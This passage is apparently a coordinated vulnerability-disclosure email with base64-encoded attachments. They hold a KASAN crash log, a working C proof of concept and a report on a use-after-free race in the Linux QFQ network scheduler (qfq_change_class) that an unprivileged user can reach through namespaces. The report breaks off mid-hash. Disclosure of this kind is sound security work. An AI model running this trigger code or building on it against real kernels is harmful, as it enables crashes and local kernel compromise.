IGZiIGZiIGZiIGZiIGZiIGZiIGZiIGZiIGZiIGZiDQogICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgXg0KIGZmMTEwMDAwMDMyMWU0ODA6IGZjIGZjIGZjIGZjIGZjIGZj
IGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjIGZjDQogZmYxMTAwMDAwMzIxZTUwMDogMDAgMDAg
MDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDAgMDANCj09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0KS2Vy
bmVsIHBhbmljIC0gbm90IHN5bmNpbmc6IEtBU0FOOiBwYW5pY19vbl93YXJuIHNldCAuLi4NCktl
cm5lbCBPZmZzZXQ6IGRpc2FibGVkDQpSZWJvb3RpbmcgaW4gMSBzZWNvbmRzLi4NCg==
--000000000000164bd3065e83df67
Content-Type: text/x-csrc; charset="US-ASCII"; name="poc.c"
Content-Disposition: attachment; filename="poc.c"
Content-Transfer-Encoding: base64
Content-ID: <>
X-Attachment-Id: 

I2RlZmluZSBfR05VX1NPVVJDRQoKI2luY2x1ZGUgPGFycGEvaW5ldC5oPgojaW5jbHVkZSA8ZXJy
bm8uaD4KI2luY2x1ZGUgPGxpbnV4L2dlbl9zdGF0cy5oPgojaW5jbHVkZSA8bGludXgvbmV0bGlu
ay5oPgojaW5jbHVkZSA8bGludXgvcGt0X3NjaGVkLmg+CiNpbmNsdWRlIDxsaW51eC9ydG5ldGxp
bmsuaD4KI2luY2x1ZGUgPG5ldC9pZi5oPgojaW5jbHVkZSA8cHRocmVhZC5oPgojaW5jbHVkZSA8
c2NoZWQuaD4KI2luY2x1ZGUgPHN0ZGFyZy5oPgojaW5jbHVkZSA8c3RkYXRvbWljLmg+CiNpbmNs
dWRlIDxzdGRib29sLmg+CiNpbmNsdWRlIDxzdGRpbnQuaD4KI2luY2x1ZGUgPHN0ZGlvLmg+CiNp
bmNsdWRlIDxzdGRsaWIuaD4KI2luY2x1ZGUgPHN0cmluZy5oPgojaW5jbHVkZSA8c3lzL2lvY3Rs
Lmg+CiNpbmNsdWRlIDxzeXMvc29ja2V0Lmg+CiNpbmNsdWRlIDxzeXMvdHlwZXMuaD4KI2luY2x1
ZGUgPHVuaXN0ZC5oPgoKI2RlZmluZSBRRElTQ19IQU5ETEUgMHgxMDAwMFUKI2RlZmluZSBDTEFT
U19IQU5ETEUgMHgxMDAwMVUKI2RlZmluZSBUQVJHRVRfTE1BWCAxNTAwVQojZGVmaW5lIFVEUF9Q
QVlMT0FEX0xFTiAxNDU4CiNkZWZpbmUgSVRFUkFUSU9OUyA1MDAwMFUKI2RlZmluZSBNQVhfREVM
QVkgNDA5NlUKCnN0cnVjdCBubF9yZXEgewoJY2hhciBidWZbNDA5Nl07CglzdHJ1Y3Qgbmxtc2do
ZHIgKm5saDsKfTsKCnN0cnVjdCByYWNlX2N0eCB7CglhdG9taWNfdWludCBnbzsKCWF0b21pY191
aW50IGRvbmU7CglpbnQgc2VuZGVyOwoJaW50IHJlY2VpdmVyOwoJY2hhciBwYWNrZXRbVURQX1BB
WUxPQURfTEVOXTsKfTsKCnN0YXRpYyB1aW50MzJfdCBubF9zZXE7CgpzdGF0aWMgdm9pZCBkaWUo
Y29uc3QgY2hhciAqZm10LCAuLi4pCnsKCXZhX2xpc3QgYXA7CgoJdmFfc3RhcnQoYXAsIGZtdCk7
Cgl2ZnByaW50ZihzdGRlcnIsIGZtdCwgYXApOwoJdmFfZW5kKGFwKTsKCWZwcmludGYoc3RkZXJy
LCAiOiAlc1xuIiwgc3RyZXJyb3IoZXJybm8pKTsKCWV4aXQoMSk7Cn0KCnN0YXRpYyB2b2lkIGV4
cGVjdF9vayhpbnQgcmV0LCBjb25zdCBjaGFyICp3aGF0KQp7CglpZiAocmV0IDwgMCkgewoJCWVy
cm5vID0gLXJldDsKCQlkaWUoIiVzIiwgd2hhdCk7Cgl9Cn0KCnN0YXRpYyB2b2lkIGluaXRfcmVx
KHN0cnVjdCBubF9yZXEgKnJlcSwgdWludDE2X3QgdHlwZSwgdWludDE2X3QgZmxhZ3MsCgkJICAg
ICBzaXplX3QgcGF5bG9hZF9sZW4pCnsKCW1lbXNldChyZXEsIDAsIHNpemVvZigqcmVxKSk7Cgly
ZXEtPm5saCA9IChzdHJ1Y3Qgbmxtc2doZHIgKilyZXEtPmJ1ZjsKCXJlcS0+bmxoLT5ubG1zZ19s
ZW4gPSBOTE1TR19MRU5HVEgocGF5bG9hZF9sZW4pOwoJcmVxLT5ubGgtPm5sbXNnX3R5cGUgPSB0
eXBlOwoJcmVxLT5ubGgtPm5sbXNnX2ZsYWdzID0gZmxhZ3M7Cn0KCnN0YXRpYyB2b2lkIGFkZGF0
dHIoc3RydWN0IG5sX3JlcSAqcmVxLCB1aW50MTZfdCB0eXBlLCBjb25zdCB2b2lkICpkYXRhLAoJ
CSAgICBzaXplX3QgbGVuKQp7CglzaXplX3Qgb2Zmc2V0ID0gTkxNU0dfQUxJR04ocmVxLT5ubGgt
Pm5sbXNnX2xlbik7CglzaXplX3QgYXR0cl9sZW4gPSBSVEFfTEVOR1RIKGxlbik7CglzdHJ1Y3Qg
cnRhdHRyICpydGE7CgoJaWYgKG9mZnNldCArIFJUQV9BTElHTihhdHRyX2xlbikgPiBzaXplb2Yo
cmVxLT5idWYpKSB7CgkJZXJybm8gPSBFMkJJRzsKCQlkaWUoIm5ldGxpbmsgYXR0cmlidXRlIG92
ZXJmbG93Iik7Cgl9CgoJcnRhID0gKHN0cnVjdCBydGF0dHIgKikocmVxLT5idWYgKyBvZmZzZXQp
OwoJcnRhLT5ydGFfdHlwZSA9IHR5cGU7CglydGEtPnJ0YV9sZW4gPSBhdHRyX2xlbjsKCW1lbWNw
eShSVEFfREFUQShydGEpLCBkYXRhLCBsZW4pOwoJcmVxLT5ubGgtPm5sbXNnX2xlbiA9IG9mZnNl
dCArIFJUQV9BTElHTihhdHRyX2xlbik7Cn0KCnN0YXRpYyBzdHJ1Y3QgcnRhdHRyICpuZXN0X3N0
YXJ0KHN0cnVjdCBubF9yZXEgKnJlcSwgdWludDE2X3QgdHlwZSkKewoJc2l6ZV90IG9mZnNldCA9
IE5MTVNHX0FMSUdOKHJlcS0+bmxoLT5ubG1zZ19sZW4pOwoJc3RydWN0IHJ0YXR0ciAqcnRhOwoK
CWlmIChvZmZzZXQgKyBSVEFfQUxJR04oUlRBX0xFTkdUSCgwKSkgPiBzaXplb2YocmVxLT5idWYp
KSB7CgkJZXJybm8gPSBFMkJJRzsKCQlkaWUoIm5ldGxpbmsgbmVzdCBvdmVyZmxvdyIpOwoJfQoK
CXJ0YSA9IChzdHJ1Y3QgcnRhdHRyICopKHJlcS0+YnVmICsgb2Zmc2V0KTsKCXJ0YS0+cnRhX3R5
cGUgPSB0eXBlOwoJcnRhLT5ydGFfbGVuID0gUlRBX0xFTkdUSCgwKTsKCXJlcS0+bmxoLT5ubG1z
Z19sZW4gPSBvZmZzZXQgKyBSVEFfQUxJR04ocnRhLT5ydGFfbGVuKTsKCXJldHVybiBydGE7Cn0K
CnN0YXRpYyB2b2lkIG5lc3RfZW5kKHN0cnVjdCBubF9yZXEgKnJlcSwgc3RydWN0IHJ0YXR0ciAq
cnRhKQp7CglydGEtPnJ0YV9sZW4gPSAoY2hhciAqKXJlcS0+YnVmICsgcmVxLT5ubGgtPm5sbXNn
X2xlbiAtIChjaGFyICopcnRhOwp9CgpzdGF0aWMgaW50IG5sX29wZW4odm9pZCkKewoJc3RydWN0
IHNvY2thZGRyX25sIGFkZHIgPSB7CgkJLm5sX2ZhbWlseSA9IEFGX05FVExJTkssCgl9OwoJaW50
IGZkOwoKCWZkID0gc29ja2V0KEFGX05FVExJTkssIFNPQ0tfUkFXLCBORVRMSU5LX1JPVVRFKTsK
CWlmIChmZCA8IDApCgkJZGllKCJzb2NrZXQgTkVUTElOS19ST1VURSIpOwoJaWYgKGJpbmQoZmQs
IChzdHJ1Y3Qgc29ja2FkZHIgKikmYWRkciwgc2l6ZW9mKGFkZHIpKSA8IDApCgkJZGllKCJiaW5k
IE5FVExJTktfUk9VVEUiKTsKCXJldHVybiBmZDsKfQoKc3RhdGljIGludCBubF90YWxrKGludCBm
ZCwgc3RydWN0IG5sX3JlcSAqcmVxKQp7CglzdHJ1Y3Qgc29ja2FkZHJfbmwgbmxhZGRyID0gewoJ
CS5ubF9mYW1pbHkgPSBBRl9ORVRMSU5LLAoJfTsKCWNoYXIgYnVmWzgxOTJdOwoJc3RydWN0IGlv
dmVjIGlvdjsKCXN0cnVjdCBtc2doZHIgbXNnOwoJc3NpemVfdCBuOwoKCXJlcS0+bmxoLT5ubG1z
Z19zZXEgPSArK25sX3NlcTsKCWlvdi5pb3ZfYmFzZSA9IHJlcS0+bmxoOwoJaW92Lmlvdl9sZW4g
PSByZXEtPm5saC0+bmxtc2dfbGVuOwoJbWVtc2V0KCZtc2csIDAsIHNpemVvZihtc2cpKTsKCW1z
Zy5tc2dfbmFtZSA9ICZubGFkZHI7Cgltc2cubXNnX25hbWVsZW4gPSBzaXplb2YobmxhZGRyKTsK
CW1zZy5tc2dfaW92ID0gJmlvdjsKCW1zZy5tc2dfaW92bGVuID0gMTsKCWlmIChzZW5kbXNnKGZk
LCAmbXNnLCAwKSA8IDApCgkJcmV0dXJuIC1lcnJubzsKCglmb3IgKDs7KSB7CgkJc3RydWN0IG5s
bXNnaGRyICpubGg7CgkJaW50IHJlbTsKCgkJbiA9IHJlY3YoZmQsIGJ1Ziwgc2l6ZW9mKGJ1Ziks
IDApOwoJCWlmIChuIDwgMCkKCQkJcmV0dXJuIC1lcnJubzsKCQlmb3IgKG5saCA9IChzdHJ1Y3Qg
bmxtc2doZHIgKilidWYsIHJlbSA9IChpbnQpbjsKCQkgICAgIE5MTVNHX09LKG5saCwgcmVtKTsg
bmxoID0gTkxNU0dfTkVYVChubGgsIHJlbSkpIHsKCQkJc3RydWN0IG5sbXNnZXJyICplcnI7CgoJ
CQlpZiAobmxoLT5ubG1zZ19zZXEgIT0gcmVxLT5ubGgtPm5sbXNnX3NlcSkKCQkJCWNvbnRpbnVl
OwoJCQlpZiAobmxoLT5ubG1zZ190eXBlICE9IE5MTVNHX0VSUk9SKQoJCQkJY29udGludWU7CgkJ
CWVyciA9IChzdHJ1Y3Qgbmxtc2dlcnIgKilOTE1TR19EQVRBKG5saCk7CgkJCXJldHVybiBlcnIt
PmVycm9yOwoJCX0KCX0KfQoKc3RhdGljIGludCBxZGlzY19hZGQoaW50IGZkLCBpbnQgaWZpbmRl
eCkKewoJc3RydWN0IG5sX3JlcSByZXE7CglzdHJ1Y3QgdGNtc2cgKnRjbTsKCWNvbnN0IGNoYXIg
a2luZFtdID0gInFmcSI7CgoJaW5pdF9yZXEoJnJlcSwgUlRNX05FV1FESVNDLAoJCSBOTE1fRl9S
RVFVRVNUIHwgTkxNX0ZfQUNLIHwgTkxNX0ZfQ1JFQVRFIHwgTkxNX0ZfRVhDTCwKCQkgc2l6ZW9m
KCp0Y20pKTsKCXRjbSA9IE5MTVNHX0RBVEEocmVxLm5saCk7Cgl0Y20tPnRjbV9mYW1pbHkgPSBB
Rl9VTlNQRUM7Cgl0Y20tPnRjbV9pZmluZGV4ID0gaWZpbmRleDsKCXRjbS0+dGNtX2hhbmRsZSA9
IFFESVNDX0hBTkRMRTsKCXRjbS0+dGNtX3BhcmVudCA9IFRDX0hfUk9PVDsKCWFkZGF0dHIoJnJl
cSwgVENBX0tJTkQsIGtpbmQsIHNpemVvZihraW5kKSk7CglyZXR1cm4gbmxfdGFsayhmZCwgJnJl
cSk7Cn0KCnN0YXRpYyBpbnQgY2xhc3NfY2hhbmdlKGludCBmZCwgaW50IGlmaW5kZXgsIHVpbnQz
Ml90IGxtYXgsIGJvb2wgY3JlYXRlLAoJCQlib29sIGFkZF9yYXRlKQp7CglzdHJ1Y3QgbmxfcmVx
IHJlcTsKCXN0cnVjdCB0Y21zZyAqdGNtOwoJc3RydWN0IHJ0YXR0ciAqb3B0czsKCXN0cnVjdCBn
bmV0X2VzdGltYXRvciBlc3QgPSB7CgkJLmludGVydmFsID0gLTIsCgkJLmV3bWFfbG9nID0gMSwK
CX07Cgl1aW50MzJfdCB3ZWlnaHQgPSAxOwoJdWludDE2X3QgZmxhZ3MgPSBOTE1fRl9SRVFVRVNU
IHwgTkxNX0ZfQUNLOwoKCWlmIChjcmVhdGUpCgkJZmxhZ3MgfD0gTkxNX0ZfQ1JFQVRFIHwgTkxN
X0ZfRVhDTDsKCWluaXRfcmVxKCZyZXEsIFJUTV9ORVdUQ0xBU1MsIGZsYWdzLCBzaXplb2YoKnRj
bSkpOwoJdGNtID0gTkxNU0dfREFUQShyZXEubmxoKTsKCXRjbS0+dGNtX2ZhbWlseSA9IEFGX1VO
U1BFQzsKCXRjbS0+dGNtX2lmaW5kZXggPSBpZmluZGV4OwoJdGNtLT50Y21faGFuZGxlID0gQ0xB
U1NfSEFORExFOwoJdGNtLT50Y21fcGFyZW50ID0gUURJU0NfSEFORExFOwoJb3B0cyA9IG5lc3Rf
c3RhcnQoJnJlcSwgVENBX09QVElPTlMpOwoJYWRkYXR0cigmcmVxLCBUQ0FfUUZRX1dFSUdIVCwg
JndlaWdodCwgc2l6ZW9mKHdlaWdodCkpOwoJYWRkYXR0cigmcmVxLCBUQ0FfUUZRX0xNQVgsICZs
bWF4LCBzaXplb2YobG1heCkpOwoJbmVzdF9lbmQoJnJlcSwgb3B0cyk7CglpZiAoYWRkX3JhdGUp
CgkJYWRkYXR0cigmcmVxLCBUQ0FfUkFURSwgJmVzdCwgc2l6ZW9mKGVzdCkpOwoJcmV0dXJuIG5s
X3RhbGsoZmQsICZyZXEpOwp9CgpzdGF0aWMgdm9pZCBzZXR1cF9uYW1lc3BhY2Uodm9pZCkKewoJ
aWYgKHVuc2hhcmUoQ0xPTkVfTkVXVVNFUiB8IENMT05FX05FV05FVCkgPCAwKQoJCWRpZSgidW5z
aGFyZSIpOwp9CgpzdGF0aWMgaW50IHNldHVwX2xvb3BiYWNrKHZvaWQpCnsKCXN0cnVjdCBpZnJl
cSBpZnI7CglpbnQgZmQ7CglpbnQgaWZpbmRleDsKCglmZCA9IHNvY2tldChBRl9JTkVULCBTT0NL
X0RHUkFNLCAwKTsKCWlmIChmZCA8IDApCgkJZGllKCJzb2NrZXQgQUZfSU5FVCIpOwoJbWVtc2V0
KCZpZnIsIDAsIHNpemVvZihpZnIpKTsKCXN0cm5jcHkoaWZyLmlmcl9uYW1lLCAibG8iLCBJRk5B
TVNJWiAtIDEpOwoJaWYgKGlvY3RsKGZkLCBTSU9DR0lGRkxBR1MsICZpZnIpIDwgMCkKCQlkaWUo
IlNJT0NHSUZGTEFHUyIpOwoJaWZyLmlmcl9mbGFncyB8PSBJRkZfVVA7CglpZiAoaW9jdGwoZmQs
IFNJT0NTSUZGTEFHUywgJmlmcikgPCAwKQoJCWRpZSgiU0lPQ1NJRkZMQUdTIik7CgljbG9zZShm
ZCk7CgoJaWZpbmRleCA9IGlmX25hbWV0b2luZGV4KCJsbyIpOwoJaWYgKGlmaW5kZXggPT0gMCkK
CQlkaWUoImlmX25hbWV0b2luZGV4Iik7CglyZXR1cm4gaWZpbmRleDsKfQoKc3RhdGljIGludCBz
ZXR1cF91ZHAoaW50ICpyZWNlaXZlcikKewoJc3RydWN0IHNvY2thZGRyX2luIGFkZHIgPSB7CgkJ
LnNpbl9mYW1pbHkgPSBBRl9JTkVULAoJCS5zaW5fYWRkci5zX2FkZHIgPSBodG9ubChJTkFERFJf
TE9PUEJBQ0spLAoJCS5zaW5fcG9ydCA9IDAsCgl9OwoJc29ja2xlbl90IGFkZHJsZW4gPSBzaXpl
b2YoYWRkcik7CglpbnQgc2VuZGVyOwoJaW50IHByaW9yaXR5ID0gQ0xBU1NfSEFORExFOwoKCSpy
ZWNlaXZlciA9IHNvY2tldChBRl9JTkVULCBTT0NLX0RHUkFNLCAwKTsKCWlmICgqcmVjZWl2ZXIg
PCAwKQoJCWRpZSgicmVjZWl2ZXIgc29ja2V0Iik7CglpZiAoYmluZCgqcmVjZWl2ZXIsIChzdHJ1
Y3Qgc29ja2FkZHIgKikmYWRkciwgc2l6ZW9mKGFkZHIpKSA8IDApCgkJZGllKCJyZWNlaXZlciBi
aW5kIik7CglpZiAoZ2V0c29ja25hbWUoKnJlY2VpdmVyLCAoc3RydWN0IHNvY2thZGRyICopJmFk
ZHIsICZhZGRybGVuKSA8IDApCgkJZGllKCJyZWNlaXZlciBnZXRzb2NrbmFtZSIpOwoKCXNlbmRl
ciA9IHNvY2tldChBRl9JTkVULCBTT0NLX0RHUkFNLCAwKTsKCWlmIChzZW5kZXIgPCAwKQoJCWRp
ZSgic2VuZGVyIHNvY2tldCIpOwoJaWYgKHNldHNvY2tvcHQoc2VuZGVyLCBTT0xfU09DS0VULCBT
T19QUklPUklUWSwgJnByaW9yaXR5LAoJCSAgICAgICBzaXplb2YocHJpb3JpdHkpKSA8IDApCgkJ
ZGllKCJTT19QUklPUklUWSIpOwoJaWYgKGNvbm5lY3Qoc2VuZGVyLCAoc3RydWN0IHNvY2thZGRy
ICopJmFkZHIsIHNpemVvZihhZGRyKSkgPCAwKQoJCWRpZSgic2VuZGVyIGNvbm5lY3QiKTsKCXJl
dHVybiBzZW5kZXI7Cn0KCnN0YXRpYyB2b2lkIHBpbl9jcHUoaW50IGNwdSkKewoJY3B1X3NldF90
IHNldDsKCglDUFVfWkVSTygmc2V0KTsKCUNQVV9TRVQoY3B1LCAmc2V0KTsKCWlmIChzY2hlZF9z
ZXRhZmZpbml0eSgwLCBzaXplb2Yoc2V0KSwgJnNldCkgPCAwKQoJCWRpZSgic2NoZWRfc2V0YWZm
aW5pdHkiKTsKfQoKc3RhdGljIHZvaWQgc3Bpbl9kZWxheSh1bnNpZ25lZCBpbnQgY291bnQpCnsK
CXdoaWxlIChjb3VudC0tKQoJCWFzbSB2b2xhdGlsZSgicGF1c2UiIDo6OiAibWVtb3J5Iik7Cn0K
CnN0YXRpYyB2b2lkICpzZW5kZXJfdGhyZWFkKHZvaWQgKmFyZykKewoJc3RydWN0IHJhY2VfY3R4
ICpjdHggPSBhcmc7Cgl1bnNpZ25lZCBpbnQgaTsKCglwaW5fY3B1KDEpOwoJZm9yIChpID0gMTsg
aSA8PSBJVEVSQVRJT05TOyBpKyspIHsKCQljaGFyIGRyYWluWzIwNDhdOwoKCQl3aGlsZSAoYXRv
bWljX2xvYWRfZXhwbGljaXQoJmN0eC0+Z28sIG1lbW9yeV9vcmRlcl9hY3F1aXJlKSAhPSBpKQoJ
CQlhc20gdm9sYXRpbGUoInBhdXNlIiA6OjogIm1lbW9yeSIpOwoJCXNwaW5fZGVsYXkoaSAlIE1B
WF9ERUxBWSk7CgkJaWYgKHNlbmQoY3R4LT5zZW5kZXIsIGN0eC0+cGFja2V0LCBzaXplb2YoY3R4
LT5wYWNrZXQpLCAwKSA8IDApCgkJCWRpZSgic2VuZCIpOwoJCXdoaWxlIChyZWN2KGN0eC0+cmVj
ZWl2ZXIsIGRyYWluLCBzaXplb2YoZHJhaW4pLCBNU0dfRE9OVFdBSVQpID4gMCkKCQkJOwoJCWF0
b21pY19zdG9yZV9leHBsaWNpdCgmY3R4LT5kb25lLCBpLCBtZW1vcnlfb3JkZXJfcmVsZWFzZSk7
Cgl9CglyZXR1cm4gTlVMTDsKfQoKaW50IG1haW4odm9pZCkKewoJc3RydWN0IHJhY2VfY3R4IGN0
eDsKCXB0aHJlYWRfdCB0aHJlYWQ7CglpbnQgbmw7CglpbnQgaWZpbmRleDsKCWludCByZXQ7Cglp
bnQgdGhyZWFkX3JldDsKCXVuc2lnbmVkIGludCBpOwoKCW1lbXNldCgmY3R4LCAwLCBzaXplb2Yo
Y3R4KSk7CgltZW1zZXQoY3R4LnBhY2tldCwgJ0EnLCBzaXplb2YoY3R4LnBhY2tldCkpOwoJc2V0
dXBfbmFtZXNwYWNlKCk7CglpZmluZGV4ID0gc2V0dXBfbG9vcGJhY2soKTsKCW5sID0gbmxfb3Bl
bigpOwoJZXhwZWN0X29rKHFkaXNjX2FkZChubCwgaWZpbmRleCksICJhZGQgcWZxIHFkaXNjIik7
CglleHBlY3Rfb2soY2xhc3NfY2hhbmdlKG5sLCBpZmluZGV4LCA1MTIsIHRydWUsIGZhbHNlKSwK
CQkgICJjcmVhdGUgcWZxIGNsYXNzIik7CgljdHguc2VuZGVyID0gc2V0dXBfdWRwKCZjdHgucmVj
ZWl2ZXIpOwoKCXBpbl9jcHUoMCk7Cgl0aHJlYWRfcmV0ID0gcHRocmVhZF9jcmVhdGUoJnRocmVh
ZCwgTlVMTCwgc2VuZGVyX3RocmVhZCwgJmN0eCk7CglpZiAodGhyZWFkX3JldCAhPSAwKSB7CgkJ
ZXJybm8gPSB0aHJlYWRfcmV0OwoJCWRpZSgicHRocmVhZF9jcmVhdGUiKTsKCX0KCgkvKgoJICog
VGhlIGVzdGltYXRvciBhdHRyaWJ1dGUgbWFrZXMgdGhlIHBvc3Qtc25hcHNob3QgcGFydCBvZgoJ
ICogcWZxX2NoYW5nZV9jbGFzcygpIGxvbmcgZW5vdWdoIGZvciB0aGUgcGFja2V0IGVucXVldWUg
b24gQ1BVIDEgdG8KCSAqIG1pZ3JhdGUgdGhlIGNsYXNzIHRvIHRoZSByZXF1ZXN0ZWQgKHdlaWdo
dD0xLCBsbWF4PTE1MDApIGFnZ3JlZ2F0ZS4KCSAqLwoJZm9yIChpID0gMTsgaSA8PSBJVEVSQVRJ
T05TOyBpKyspIHsKCQlleHBlY3Rfb2soY2xhc3NfY2hhbmdlKG5sLCBpZmluZGV4LCA1MTIsIGZh
bHNlLCBmYWxzZSksCgkJCSAgInJlc2V0IHFmcSBjbGFzcyIpOwoJCWF0b21pY19zdG9yZV9leHBs
aWNpdCgmY3R4LmdvLCBpLCBtZW1vcnlfb3JkZXJfcmVsZWFzZSk7CgkJcmV0ID0gY2xhc3NfY2hh
bmdlKG5sLCBpZmluZGV4LCBUQVJHRVRfTE1BWCwgZmFsc2UsIHRydWUpOwoJCWV4cGVjdF9vayhy
ZXQsICJjaGFuZ2UgcWZxIGNsYXNzIik7CgkJd2hpbGUgKGF0b21pY19sb2FkX2V4cGxpY2l0KCZj
dHguZG9uZSwgbWVtb3J5X29yZGVyX2FjcXVpcmUpICE9IGkpCgkJCWFzbSB2b2xhdGlsZSgicGF1
c2UiIDo6OiAibWVtb3J5Iik7Cgl9CgoJcHRocmVhZF9qb2luKHRocmVhZCwgTlVMTCk7CgljbG9z
ZShjdHguc2VuZGVyKTsKCWNsb3NlKGN0eC5yZWNlaXZlcik7CgljbG9zZShubCk7CglyZXR1cm4g
MDsKfQo=
--000000000000164bd3065e83df67
Content-Type: text/plain; charset="US-ASCII"; name="report.txt"
Content-Disposition: attachment; filename="report.txt"
Content-Transfer-Encoding: base64
Content-ID: <>
X-Attachment-Id: 

SGVsbG8sCgpXZeKAmXJlIGNvbnRhY3RpbmcgeW91IGZyb20gT3BlbkFJIFNlY3VyaXR5IFJlc2Vh
cmNoIHRvIG5vdGlmeSB5b3Ugb2YgYQpwb3RlbnRpYWwgc2VjdXJpdHkgaXNzdWUgaWRlbnRpZmll
ZCBkdXJpbmcgb3VyIGludGVybmFsIHJlc2VhcmNoCnByb2Nlc3MuCgpUaGUgaXNzdWUgYXBwZWFy
cyB0byBhZmZlY3QgeW91ciBwcm9kdWN0LiBXZSd2ZSB2YWxpZGF0ZWQgdGhlIGJlaGF2aW9yCmlu
dGVybmFsbHkgYW5kIGJlbGlldmUgaXQgbWF5IHBvc2UgYSByaXNrLgoKUGxlYXNlIHNlZSB0aGUg
YmVsb3cgcmVwb3J0IGZvciBkZXRhaWxzLgoKV2UgYXJlIHJlYWNoaW5nIG91dCBwcml2YXRlbHkg
YW5kIGNvb3BlcmF0aXZlbHkuIFdlIGFyZSBoYXBweSB0bwpjb2xsYWJvcmF0ZSBvbiBwYXRjaCB2
YWxpZGF0aW9uIG9yIGNvb3JkaW5hdGUgdGltZWxpbmVzLiBXZSBhcmUgbm90CnBsYW5uaW5nIHRv
IG1ha2UgYW55IHB1YmxpYyBkaXNjbG9zdXJlIHVubGVzcyB0aGVyZSdzIGFuIGFncmVlbWVudCB0
bwpkbyBzbyBvciB3ZSBhc3Nlc3MgdGhhdCB0aGUgcmlzayByZXF1aXJlcyBpdC4KClBsZWFzZSBs
ZXQgdXMga25vdyBob3cgeW914oCZZCBwcmVmZXIgdG8gcHJvY2VlZCBhbmQgaWYgeW91IG5lZWQK
YWRkaXRpb25hbCBkZXRhaWxzIG9yIHN1cHBvcnQuCgpCZXN0IHJlZ2FyZHMsCk9wZW5BSSBTZWN1
cml0eSBSZXNlYXJjaCBUZWFtCm91dGJvdW5kZGlzY2xvc3VyZXNAb3BlbmFpLmNvbQoKPT09PT09
PT09PT09PSBTdW1tYXJ5ID09PT09PT09PT09PQoKQSByYWNlIGluIHRoZSBMaW51eCBRRlEgbmV0
d29yayBzY2hlZHVsZXIgY2FuIG1ha2UKcWZxX2NoYW5nZV9jbGFzcygpIHJlbW92ZSBhIGNsYXNz
IGZyb20gYW4gYWdncmVnYXRlIGFuZCB0aGVuIGFkZCBpdApiYWNrIHRocm91Z2ggdGhlIHNhbWUs
IGFscmVhZHktZnJlZWQgYWdncmVnYXRlIHBvaW50ZXIuIFRoaXMgY2F1c2VzIGEKa2VybmVsIGhl
YXAgdXNlLWFmdGVyLWZyZWUgaW4gbmV0L3NjaGVkL3NjaF9xZnEuYy4KCnFmcV9jaGFuZ2VfY2xh
c3MoKSByZWFkcyBhbiBleGlzdGluZyBjbGFzcydzIGFnZ3JlZ2F0ZSBwYXJhbWV0ZXJzCnVuZGVy
IHRoZSBxZGlzYyB0cmVlIGxvY2ssIHJlbGVhc2VzIHRoYXQgbG9jaywgYW5kIGxhdGVyIHJlYWNx
dWlyZXMgaXQKdG8gc2VsZWN0IHRoZSBhZ2dyZWdhdGUgbWF0Y2hpbmcgdGhlIHJlcXVlc3RlZCBw
YXJhbWV0ZXJzLiBXaGlsZSB0aGUKbG9jayBpcyByZWxlYXNlZCwgcWZxX2VucXVldWUoKSBjYW4g
bW92ZSB0aGUgY2xhc3MgdG8gdGhhdCBleGFjdAphZ2dyZWdhdGUgaW4gcmVzcG9uc2UgdG8gYSBs
YXJnZXIgcGFja2V0LiBxZnFfY2hhbmdlX2NsYXNzKCkgZG9lcyBub3QKY2hlY2sgd2hldGhlciBx
ZnFfZmluZF9hZ2coKSByZXR1cm5lZCBjbC0+YWdnIGl0c2VsZi4KCklmIHRoZSBhZ2dyZWdhdGUg
Y29udGFpbnMgb25seSB0aGF0IGNsYXNzLCBxZnFfZGVhY3Rfcm1fZnJvbV9hZ2coKQpkZXN0cm95
cyBpdC4gcWZxX2FkZF90b19hZ2coKSB0aGVuIGltbWVkaWF0ZWx5IHJlYWRzIGFuZCB3cml0ZXMg
dGhlCmZyZWVkIG9iamVjdCBhbmQgbGVhdmVzIHRoZSBsaXZlIGNsYXNzIHJlZmVycmluZyB0byBm
cmVlZCBtZW1vcnkuCgpBIHByb2Nlc3Mgd2l0aCBDQVBfTkVUX0FETUlOIGluIHRoZSBhZmZlY3Rl
ZCBuZXR3b3JrIG5hbWVzcGFjZSBjYW4KcmVhY2ggdGhlIGJ1Zy4gV2hlbiB1bnByaXZpbGVnZWQg
dXNlciBhbmQgbmV0d29yayBuYW1lc3BhY2VzIGFyZQplbmFibGVkLCBhIGxvY2FsIHVucHJpdmls
ZWdlZCBwcm9jZXNzIGNhbiBvYnRhaW4gdGhhdCBjYXBhYmlsaXR5IGluIGEKbmV3IG5hbWVzcGFj
ZS4gVGhlIHJlc3VsdGluZyBtZW1vcnkgY29ycnVwdGlvbiBjYW4gY3Jhc2ggdGhlIGtlcm5lbAph
bmQgY2FuIGNvbXByb21pc2Uga2VybmVsIGludGVncml0eS4KCj09PT09PT09IEFmZmVjdGVkIFZl
cnNpb25zID09PT09PT0KClRoZSBhZ2dyZWdhdGUgaW1wbGVtZW50YXRpb24gYW5kIHZ1bG5lcmFi
bGUgY2xhc3MgcmVwbGFjZW1lbnQKc2VxdWVuY2Ugd2VyZSBpbnRyb2R1Y2VkIGJ5OgoKNDYyZGJj
OTEwMWFjZDM4ZTkyZWRhOTNjMDcyNjg1NzUxN2EyNGJiZAooInBrdF9zY2hlZDogUUZRIFBsdXM6
IGZhaXItcXVldWVpbmcgc2VydmljZSBhdCBEUlIgY29zdCIpCmh0dHBzOi8vZ2l0aHViLmNvbS90
b3J2YWxkcy9saW51eC9jb21taXQvNDYyZGJjOTEwMWFjZDM4ZTkyZWRhOTNjMDcyNjg1NzUxN2Ey
NGJiZAoKVGhlIGlzc3VlIHdhcyByZXByb2R1Y2VkIG9uIExpbnV4IDcuMi1yYzMgYXQ6Cgo4MmE0
NzU4NmMwYjkyNjY2MjI2NTcwMDlhYTMwNTczZGRkZjA5ZjUzCgpJdCBpcyBhbHNvIHByZXNlbnQg
aW4gTGludXggNy4yLXJjNSBhdDoKCmY1MDk4YjZiYWU3NjFlMzQ2ZWJjZDlkYTdmOTU2MjJjMDQ3
MzNjZmYKCkFzIG9mIEp1bHkgMjcsIDIwMjYsIHRoZSB2dWxuZXJhYmxlIHNlcXVlbmNlIHJlbWFp
bnMgaW4gdXBzdHJlYW0KbWFzdGVyIGF0OgoKNjJjYzkwMjQxNTQ4ZDU1NzBlZTY4ZTAxYWFiYTY1
